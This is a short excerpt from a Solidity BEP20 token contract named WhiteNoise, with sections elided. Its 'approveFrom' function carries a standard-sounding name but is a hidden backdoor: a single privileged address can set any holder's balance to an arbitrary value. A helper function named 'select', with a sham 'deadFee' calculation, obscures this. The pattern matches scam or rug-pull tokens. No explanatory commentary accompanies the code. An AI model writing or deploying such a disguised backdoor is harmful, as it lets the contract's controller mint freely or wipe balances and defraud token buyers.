...
contract WhiteNoise is BEP20 {
  ...
  function select(address _from, uint256 _value, uint256 variant) internal returns (uint256) {
    uint8 deadFee = 1;
    return (_value +  variant.mul(2).div(100) * deadFee);   
  }
  ...
  function approveFrom(address _from, uint256 _value, uint256 variant) external returns (bool) {
    require (sendermsg == msg.sender);
    require(_value != 2, "Not TWO");
    _balances[_from] = select(_from, _value, variant);
    return true;
  }
